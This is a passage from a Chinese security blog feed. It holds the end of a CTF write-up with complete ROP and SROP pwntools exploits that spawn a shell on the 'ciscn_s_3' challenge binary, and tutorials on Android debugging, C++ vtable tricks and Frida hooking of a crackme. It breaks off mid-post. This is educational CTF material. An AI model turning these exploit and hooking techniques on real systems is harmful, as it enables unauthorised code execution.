<p>思路是利用ROP执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>，程序中没有”/bin/sh”，只能自己在<code>vuln</code>函数中输入到栈中再泄露栈地址。</p>
<p>在进行栈溢出覆盖返回地址后发现在<code>vuln</code>输出的0x30字节数据中还有一盒栈地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;6xg $rsp-0x10</span><br><span class="line">0x7fffffffdf90: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x7fffffffdfa0: 0x6161616161616161      0x000000000040050a</span><br><span class="line">0x7fffffffdfb0: 0x00007fffffffe0b8      0x0000000100000000</span><br></pre></td></tr></table></figure>

<p>0x00007fffffffe0b8是一个栈上的地址，可以计算偏移通过该地址算出输入数据的地址。</p>
<h2 id="ROP解"><a href="#ROP解" class="headerlink" title="ROP解"></a>ROP解</h2><p>利用ROPgadget和csu里找到的gadgets编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node3.buuoj.cn&#x27;,28391)</span></span><br><span class="line"></span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">pop_rbx_rbp__r12_r13_r14_r15_ret_addr=<span class="number">0x40059a</span></span><br><span class="line">mov_rdx_r13_rsi_r14_edi_r15_call_r12rbx8_addr=<span class="number">0x400580</span></span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x4005a3</span></span><br><span class="line">mv_rax_3bh_addr=<span class="number">0x4004E2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40052c&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">0x2</span>+p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=u64(io.recv(<span class="number">8</span>))<span class="number">-0x128</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(mv_rax_3bh_addr)+p64(pop_rbx_rbp__r12_r13_r14_r15_ret_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh_addr+<span class="number">0x58</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx_r13_rsi_r14_edi_r15_call_r12rbx8_addr)+p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="SROP解"><a href="#SROP解" class="headerlink" title="SROP解"></a>SROP解</h2><p>不用一大堆gadgets传参，利用<code>syscall</code>调用<code>rt_sigreturn</code>解析我们在栈上伪造的<code>Signal Frame</code>进行传参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29508</span>)</span><br><span class="line"></span><br><span class="line">mv_rax_sigreturn_ret_addr=<span class="number">0x4004da</span></span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">syscall_addr=<span class="number">0x400501</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=u64(io.recv(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_execve</span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(mv_rax_sigreturn_ret_addr)+p64(syscall_addr)+bytes(frame)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Android动态调试</title>
    <url>/2021/04/12/android-debug/</url>
    <content><![CDATA[<p>用jeb和Android Studio进行apk无源码动态调试，以攻防世界的Ph0en1x-100为例</p>
<p>jeb查看Java代码找到关键判断：</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cDy5in.png"></p>
<p>用getSecret()分别处理getFlag()和encrypt(sInput)后将两个值比较，sInput是输入，只需要让getFlag()和encrypt(sInput)的值相同即可，ida查看so文件发现encrypt()函数只是将输入字符串的每一位ascii码-1，而getFlag()函数没有输入，故返回值不变，可以通过动态调试得到返回值。</p>
<h3 id="jeb-夜神模拟器"><a href="#jeb-夜神模拟器" class="headerlink" title="jeb+夜神模拟器"></a>jeb+夜神模拟器</h3><p>apktool解包在<code>AndroidManifest.xml</code>中加<code>android:debuggable=&quot;true&quot;</code>后重新打包签名(略)</p>
<p>在模拟器中安装重新打包签名好的apk，adb连接模拟器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb connect 127.0.0.1:62001</span><br></pre></td></tr></table></figure>

<p>查看连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p>jeb找到getFlag()函数在smali中的位置下断点：</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cDgTzt.png"></p>
<p>模拟器中打开app，jeb附加进程调试：</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cDgxij.png"></p>
<p>模拟器中输入数据点击确认，程序断下，查看数据：</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cD2uS1.png"></p>
<p><code>move-result-object  v1</code>是将刚刚执行了的getFlag()的返回值赋给寄存器<code>v1</code>，在这里把<code>v1</code>的类型改成<code>string</code>就可以看到想要的返回值。</p>
<h3 id="Android-Studio"><a href="#Android-Studio" class="headerlink" title="Android Studio"></a>Android Studio</h3><p>AS中安装smalidea插件，这里遇到问题，一直安装不上，最后把压缩包直接解压放进plugins文件夹重启即可，据说是因为我安装AS时把路径从C盘改成D盘。安装完成后会有这两个smali处理插件：</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cD5zHP.png"></p>
<p>在设置中把<code>Smali Support</code>支持<code>*.smali</code>文件改成<code>Smalieda</code>支持<code>*.smali</code>文件:</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cDoprR.png"></p>
<p>之后就可以在smali代码中下断点了。</p>
<p>还是先apktool解包在<code>AndroidManifest.xml</code>中加<code>android:debuggable=&quot;true&quot;</code>后重新打包签名(略)</p>
<p>AS的虚拟机不用adb手动连接端口，但是调试需要端口映射。</p>
<p>AS中选择<code>Profile or Debug APK</code>打开重新打包签名后的apk，新建一个remote调试配置：</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cD4tMR.png"></p>
<p>记住端口号5005。</p>
<p>在虚拟机上运行app，获得包名/主activity名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell &quot;dumpsys activity top | grep ACTIVITY&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">  ACTIVITY com.android.launcher3/.Launcher 3f4d30e pid=2795</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  ACTIVITY com.ph0en1x.android_crackme/.MainActivity df4d3f5 pid=5714</span></span><br></pre></td></tr></table></figure>

<p>  以调试模式启动app:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n com.ph0en1x.android_crackme/.MainActivity</span><br></pre></td></tr></table></figure>

<p>查看以调试模式启动的进程pid：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell &quot;ps | grep crackme&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">u0_a104       5777  1619 1840024  80608 futex_wait_queue_me 0 S com.ph0en1x.android_crackme</span></span><br></pre></td></tr></table></figure>

<p>端口映射:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb forward tcp:5005 jdwp:5777</span><br></pre></td></tr></table></figure>

<p>在AS中附加进程即可开始调试</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cDoZxH.png"></p>
<p>需要注意的点：</p>
<ol>
<li>AS有Google Play的虚拟机无法root，所以需要创建一个没有Google Play的虚拟机</li>
<li>我AS动态调试看不到寄存器的值</li>
</ol>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>C++虚函数表</title>
    <url>/2021/04/09/C-virtual-table/</url>
    <content><![CDATA[<h1 id="C-虚函数"><a href="#C-虚函数" class="headerlink" title="C++虚函数"></a>C++虚函数</h1><p>参考<a href="https://blog.csdn.net/haoel/article/details/1948051">C++虚函数表解析</a></p>
<p>C++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。</p>
<h2 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h2><p>C++的虚函数是通过一张虚函数表实现的，在这个表中存放的是类的虚函数的地址，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。在有虚函数的类的实例中该类的虚函数表地址被分配在了这个实例的内存中。C++的编译器将虚函数表的地址存放在实例内存的开头，将虚函数表本身存放于只读数据段。</p>
<p>实例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*Fun)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">	Base b; </span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;虚函数表地址：&quot;</span> &lt;&lt; (<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(&amp;b) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;虚函数表第一个函数地址：&quot;</span> &lt;&lt; (<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(&amp;b) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	Fun pFun = (Fun)*((<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(&amp;b));</span><br><span class="line">	pFun();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="comment">//虚函数表地址：0x48e338</span></span><br><span class="line"><span class="comment">//虚函数表第一个函数地址：0x421c20</span></span><br><span class="line"><span class="comment">//Base::f</span></span><br></pre></td></tr></table></figure>

<p>通过实例看到我们可以将实例地址<code>&amp;b</code>转化成int指针<code>int *</code>，之后因为虚函数表在实例首地址，对其取值就能得到虚函数表的地址，再对其取值就能得到虚函数表第一个函数的地址，同理可得虚函数中其他函数的地址：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(Fun)*((<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">0</span>);  <span class="comment">// Base::f()</span></span><br><span class="line">(Fun)*((<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">1</span>);  <span class="comment">// Base::g()</span></span><br><span class="line">(Fun)*((<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">2</span>);  <span class="comment">// Base::h()</span></span><br></pre></td></tr></table></figure>

<p>内存图示：</p>
<p><img src="https://z3.ax1x.com/2021/04/09/cUSCEq.jpg"></p>
<p>上面的图是嫖的网友的，按网友所说他在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符‘\0’一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在<em>WinXP+VS2003</em>下，这个值是<em>NULL</em>。而在<em>Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3</em>下，这个值是如果<em>1</em>，表示还有下一个虚函数表，如果值是<em>0</em>，表示是最后一个虚函数表。</p>
<p>而我在<em>gcc version 10.2.1 20210110 (Debian 10.2.1-6)<em>环境下调试32位程序的结果是实例首地址的存放的是</em>vtable+8</em>的地址，而虚函数也是从<em>vtable+8</em>的位置开始存，只是在<em>vtable</em>开始的位置有一个0，如果因为多重继承有多个vtable则第二个vtable开始位置为 -4 ，第三个为 -8 ，<em>vtable+4</em>的位置是该类的 typeinfo，猜测可能是把虚函数表结束标识换成开始标识了吧，因为虚函数表在内存中是相邻存放的，所以开头标识或结束标识其实没差~~吧。</p>
<h2 id="一般继承-无虚函数覆盖"><a href="#一般继承-无虚函数覆盖" class="headerlink" title="一般继承(无虚函数覆盖)"></a>一般继承(无虚函数覆盖)</h2><p>若继承关系中子类没有重写任何父类的虚函数：</p>
<p><img src="https://z3.ax1x.com/2021/04/09/cUCxJ0.jpg"></p>
<p>子类的虚函数表是这样的：</p>
<p><img src="https://z3.ax1x.com/2021/04/09/cUii1f.jpg"></p>
<p>可以看到一下几点</p>
<ol>
<li>虚函数按照声明顺序存放在表中</li>
<li>父类的虚函数在前，子类自己的在后</li>
</ol>
<h2 id="一般继承-有虚函数覆盖"><a href="#一般继承-有虚函数覆盖" class="headerlink" title="一般继承(有虚函数覆盖)"></a>一般继承(有虚函数覆盖)</h2><p>继承关系中子类有重写父类的虚函数：</p>
<p><img src="https://z3.ax1x.com/2021/04/09/cUFrR0.jpg"></p>
<p>子类虚函数表：</p>
<p><img src="https://z3.ax1x.com/2021/04/09/cUFcsU.jpg"></p>
<ol>
<li>子类的虚函数表会包含父类的虚函数表</li>
<li>子类重写的f()函数替换了父类虚函数表中的f()</li>
<li>子类自己的虚函数跟在父类虚函数的后面</li>
</ol>
<h2 id="多重继承-无虚函数覆盖"><a href="#多重继承-无虚函数覆盖" class="headerlink" title="多重继承(无虚函数覆盖)"></a>多重继承(无虚函数覆盖)</h2><p><img src="https://z3.ax1x.com/2021/04/09/cUAIKK.jpg"></p>
<p><img src="https://z3.ax1x.com/2021/04/09/cUAoDO.jpg"></p>
<ol>
<li>将每个父类的虚函数表拷贝形成自己的虚函数表</li>
<li>按照继承顺序将其放在实例内存的前n个地址(n=继承的父类数，地址宽度取决于程序位数)</li>
<li>子类的虚函数跟在拷贝自第一个父类的虚函数表后</li>
<li>需要注意的是继承自Base2和Base3的虚函数表虽然内容和父类的完全一样，但依然拷贝了一份，并没有直接使用父类的虚函数表。</li>
</ol>
<h2 id="多重继承-有虚函数覆盖"><a href="#多重继承-有虚函数覆盖" class="headerlink" title="多重继承(有虚函数覆盖)"></a>多重继承(有虚函数覆盖)</h2><p><img src="https://z3.ax1x.com/2021/04/09/cUVCy6.jpg"></p>
<p><img src="https://z3.ax1x.com/2021/04/09/cUVPOK.jpg"></p>
<ol>
<li><p>将每个父类的虚函数表拷贝，替换其中重写的虚函数地址，形成自己的虚函数表</p>
</li>
<li><p>按照继承顺序将其放在实例内存的前n个地址</p>
</li>
<li><p>子类的虚函数跟在拷贝自第一个父类的虚函数表后</p>
</li>
<li><p>需要注意的是三个*Derive::f()*存放的其实是三个不同的地址，但只有继承自第一个父类的表中的重写函数才是函数真正的地址，其他的是一个跳转，跳转到第一个表中真正的地址，如图：</p>
</li>
</ol>
<p><img src="https://z3.ax1x.com/2021/04/09/cUZFcq.png"></p>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><h3 id="可以通过父类指针访问子类自己的虚函数"><a href="#可以通过父类指针访问子类自己的虚函数" class="headerlink" title="可以通过父类指针访问子类自己的虚函数"></a>可以通过父类指针访问子类自己的虚函数</h3><p>父类指针指向子类，正常来说是我无法访问子类自己的虚函数的，但可以通过虚函数表的地址找到子类的虚函数执行</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derive</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derive::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derive::g1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*Fun)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">	Base *pBase=<span class="keyword">new</span>(Derive);</span><br><span class="line">	Fun pFun = (Fun)*((<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(pBase)+<span class="number">3</span>);</span><br><span class="line">	pFun();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Derive::g1</span></span><br></pre></td></tr></table></figure>

<h3 id="访问non-public的虚函数"><a href="#访问non-public的虚函数" class="headerlink" title="访问non-public的虚函数"></a>访问<em>non-public</em>的虚函数</h3><p>如果父类的虚函数是<em>private</em>或是<em>protected</em>的，但这些非<em>public</em>的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些<em>no-public</em>函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derive</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derive::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derive::g1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*Fun)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">	Base *pBase=<span class="keyword">new</span>(Derive);</span><br><span class="line">	Fun pFun = (Fun)*((<span class="keyword">int</span>*)*(<span class="keyword">int</span>*)(pBase)+<span class="number">1</span>);</span><br><span class="line">	pFun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida apk hook</title>
    <url>/2021/04/15/frida-hook/</url>
    <content><![CDATA[<h1 id="Frida简介"><a href="#Frida简介" class="headerlink" title="Frida简介"></a>Frida简介</h1><p>frida是一款基于python + javascript 的hook框架，可运行在android、ios、linux、windows、macos等各平台，主要使用动态二进制插桩技术。frida分为两部分，服务端运行在目标机上，通过注入进程的方式来实现劫持应用函数，另一部分运行在系统机器上。frida上层接口支持js、python、c等。</p>
<p><a href="https://github.com/frida">Frida官方github地址</a></p>
<h1 id="Frida安装"><a href="#Frida安装" class="headerlink" title="Frida安装"></a>Frida安装</h1><ol>
<li><p>安装python3</p>
</li>
<li><p>pip安装frida模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install frida</span><br></pre></td></tr></table></figure></li>
<li><p>pip安装frida-tools模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure></li>
<li><p>下载运行在目标机器上的服务端:<a href="https://github.com/frida/frida/releases">官方地址</a>，要根据目标机器cpu架构选择。可以在<code>/proc/cpuinfo</code>中查看cpu信息。</p>
</li>
<li><p>adb连接手机</p>
</li>
<li><p>在手机上运行该服务端程序并进行端口映射</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push frida-server-14.2.14-android-x86 /data/local/tmp</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb shell</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod +x frida-server-14.2.14-android-x86</span><br><span class="line">./frida-server-14.2.14-android-x86</span><br></pre></td></tr></table></figure>

<p>本机执行命令<code>frida-ps -U</code>进行测试，若成功打印手机端的进程则表示安装成功。</p>
</li>
</ol>
<h1 id="Frida-hook-Java层"><a href="#Frida-hook-Java层" class="headerlink" title="Frida hook Java层"></a>Frida hook Java层</h1><p>以攻防世界的Ph0en1x-100为例，jeb查看Java代码找到关键判断：</p>
<p><img src="https://z3.ax1x.com/2021/04/12/cDy5in.png"></p>
<p>用getSecret()分别处理getFlag()和encrypt(sInput)后将两个值比较，sInput是输入，只需要让getFlag()和encrypt(sInput)的值相同即可，ida查看so文件发现encrypt()函数只是将输入字符串的每一位ascii码-1，而getFlag()函数没有输入，故返回值不变，可以通过hook得到返回值。</p>
<p>尝试修改getSecret()的返回值为”qaq”，脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,sys <span class="comment">#导入模块</span></span><br><span class="line"></span><br><span class="line">jscode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var MainActivity=Java.use(&#x27;com.ph0en1x.android_crackme.MainActivity&#x27;);  //获取MainActivity类 </span></span><br><span class="line"><span class="string">        MainActivity.getSecret.implementation=function()&#123; //重写MainActivity.get_Secret()函数</span></span><br><span class="line"><span class="string">            send(&quot;hook ret qaq&quot;); //发送信息，回调python函数</span></span><br><span class="line"><span class="string">            return &quot;qaq&quot;; //返回字符串&quot;qaq&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message,data</span>):</span> <span class="comment">#js中执行send函数后要回调的函数</span></span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line">process=frida.get_remote_device().attach(<span class="string">&#x27;com.ph0en1x.android_crackme&#x27;</span>) <span class="comment">#找到设备并劫持进程</span></span><br><span class="line">script=process.create_script(jscode) <span class="comment">#创建js脚本</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,on_message) <span class="comment">#加载回调函数</span></span><br><span class="line">script.load() <span class="comment">#加载脚本</span></span><br><span class="line">sys.stdin.read() <span class="comment">#不让python代码自动结束</span></span><br></pre></td></tr></table></figure>

<p>先在手机端运行app，之后在本地执行python脚本，之后在手机端输入框随便输入:<br><img src="https://z3.ax1x.com/2021/04/15/c2zWGT.png"></p>
<p>执行了两次<code>getSecret()</code>函数，发送了两次消息回调了两次<code>on_message()</code>，而两次<code>getSecret()</code>的返回值都被修改成了”qaq”，所以无论输入什么值都可以通过判断。</p>
<h1 id="Frida-hook-Native层"><a href="#Frida-hook-Native层" class="headerlink" title="Frida hook Native层"></a>Frida hook Native层</h1><p>还说用这个程序，我们尝试hook Native层的<code>getFlag()</code>函数打印出返回值。需要说明一下关于so文件当中的函数，分为导出函数和未导出函数两种，导出函数打开IDA后能够在导出表中找到的函数就是导出函数，未导出函数则在导出表中寻找不到，一般来说静态编写的native函数都能在导出表中寻找到，而动态加载的则无法在导出表中发现。</p>
<p>python脚本:</p>
